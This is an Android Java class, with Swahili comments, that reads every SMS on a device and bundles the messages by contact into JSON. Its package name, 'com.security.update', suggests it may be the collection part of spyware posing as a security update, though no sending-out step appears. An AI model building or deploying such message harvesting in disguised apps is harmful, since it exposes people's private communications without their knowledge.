package com.security.update;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.Telephony;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.HashMap;
import java.util.Map;

public class SmsConversationHandler {
    private static final String TAG = "SmsConversationHandler";
    
    public static JSONArray getAllSmsConversations(ContentResolver contentResolver) {
        JSONArray conversationsArray = new JSONArray();
        Map<String, JSONObject> conversationMap = new HashMap<>();
        
        try {
            // Soma SMS zote zilizo kwenye thread format
            Cursor cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                new String[]{
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.THREAD_ID
                },
                null, null,
                Telephony.Sms.DATE + " ASC"  // Soma kwa mpangilio wa zamani zaidi kwanza
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String threadId = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                    
                    // Tengeneza conversation key kwa mtu mmoja mmoja
                    String conversationKey = address != null ? address : "unknown";
                    
                    JSONObject message = new JSONObject();
                    message.put("sender", address);
                    message.put("message", body);
                    message.put("timestamp", timestamp);
                    message.put("type", getMessageType(type));
                    message.put("message_id", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID)));
                    
                    // Ongeza ujumbe kwenye conversation ya mtu huyo
                    if (!conversationMap.containsKey(conversationKey)) {
                        JSONObject conversation = new JSONObject();
                        conversation.put("contact", address);
                        conversation.put("phone_number", address);
                        conversation.put("conversation_id", threadId);
                        conversation.put("messages", new JSONArray());
                        conversationMap.put(conversationKey, conversation);
                    }
                    
                    JSONObject conversation = conversationMap.get(conversationKey);
                    JSONArray messages = conversation.getJSONArray("messages");
                    messages.put(message);
                }
                cursor.close();
                
                // Badilisha map kuwa array
                for (JSONObject conversation : conversationMap.values()) {
                    conversationsArray.put(conversation);
                }
                
                Log.d(TAG, "✅ Zimekusanywa conversations: " + conversationsArray.length());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Hitilafu ya kusoma conversations: " + e.getMessage());
        }
        
        return conversationsArray;
    }
    
    private static String getMessageType(int type) {
        switch (type) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "received";
            case Telephony.Sms.MESSAGE_TYPE_SENT: return "sent";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "draft";
            default: return "unknown";
        }
    }
}
